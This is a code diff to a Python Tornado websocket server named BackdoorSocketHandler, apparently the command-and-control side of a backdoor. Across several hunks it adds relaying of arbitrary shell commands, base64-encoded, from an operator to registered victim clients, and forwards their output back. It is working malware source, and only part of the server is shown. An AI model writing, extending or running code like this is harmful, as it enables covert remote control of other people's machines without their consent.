@@ -1,6 +1,5 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-import shlex
 from _docpot import docopt
 import tornado.web
 import tornado.websocket
@@ -80,6 +79,11 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                     to_controler.to_client_id = self.ID
                     to_controler.send_json({'connected': self.ID})
 
+                elif ('data' in msg or 'char' in msg or 'end' in msg) and to is not None:
+                    to_controler = self.clients[to]
+                    to_controler.to_client_id = self.ID
+                    to_controler.send_json(msg)
+
                 # pass
                 # '''
                 # ======================
@@ -140,13 +144,25 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                 print 'find new client: ' + str(self.ID) + ' -- ' + self.request.remote_ip + '(' + self.UUID + ')'
                 BackdoorSocketHandler.ID_LASTEST += 1
 
-    def parse_command(self, cmd):
-        input_array = shlex.split(cmd)
+    def control_to_client(self, json_obj):
+        if self.to_client_id in self.clients:
+            to = self.clients[self.to_client_id]
+            to.send_json(json_obj)
+        else:
+            self.to_client_id = None        # todo
+            self.send_json({'disconnected': 'offline'})
 
+    def parse_command(self, cmd):
+        input_array = cmd.strip().split()
         command_str = input_array[0]
+
         if command_str != 'hack':
-            self.send_data('No aviable command.\n')
-            self.send_end()
+            if self.to_client_id is None:
+                self.send_data('No aviable command.\n')
+                self.send_end()
+            else:
+                self.control_to_client({'cmd': b64encode(cmd)})
+
             return
 
         try:
@@ -196,7 +212,7 @@ Options:
             elif args['disconnect']:
                 if self.to_client_id is not None:
                     self.to_client_id = None
-                    self.send_json({'disconnected': self.to_client_id})
+                    self.send_json({'disconnected': ''})
 
                 else:
                     self.send_data('You have not connected to any clients.\n')
